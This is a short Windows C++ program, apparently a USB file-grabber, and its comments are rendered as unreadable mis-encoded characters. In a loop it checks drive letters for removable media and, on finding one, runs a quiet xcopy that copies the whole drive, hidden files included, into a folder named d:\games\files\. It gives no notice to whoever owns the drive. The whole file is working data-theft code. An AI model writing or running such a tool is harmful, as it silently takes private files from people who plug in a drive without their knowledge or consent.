#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
using namespace std;

char src[20] = "X:\\";
char dest[20] = "d:\\games\\files\\";	//��ſ������ݵĵ�ַ

int main() {
	bool flag = false;
	while (!flag) {
		UINT DiskType;
		for (unsigned char i = 'B'; i < 'Z'; i++) {	//�����̷�
			src[0] = i;
			DiskType = GetDriveType(src);
			if (DiskType == DRIVE_REMOVABLE) {	//�ж��Ƿ��ǿ��ƶ��洢�豸
				char cmd[200];
				sprintf(cmd, "cmd /c xcopy %c: %s /e /y /q /h", i, dest);
				system(cmd);
				flag = true;
			}
		}
		Sleep(5000);  //5sec���һ��U��
	}
	return 0;
}